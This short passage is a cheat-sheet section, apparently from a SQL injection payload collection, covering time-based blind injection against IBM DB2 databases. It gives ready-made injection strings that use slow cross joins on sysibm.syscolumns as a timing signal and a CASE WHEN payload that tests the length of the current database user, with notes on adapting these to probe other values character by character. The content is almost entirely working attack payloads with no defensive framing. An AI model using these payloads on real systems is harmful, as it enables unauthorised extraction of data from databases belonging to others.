## Time-based blind
No native sleep; use slow queries like cross joins to delay if true.

Base slow if true:
' AND (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b WHERE a.colname = b.colname) >0 -- (slow on large tables)

To find length:

CASE WHEN LENGTH(user)>16 THEN (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) ELSE 0 END >0
' AND CASE WHEN LENGTH(user)>16 THEN (SELECT COUNT(*) FROM sysibm.syscolumns a, sysibm.syscolumns b) ELSE 0 END >0 --

(No delay)

Similarly adapt for other checks, replacing the condition.

For chars, similar adaptation.

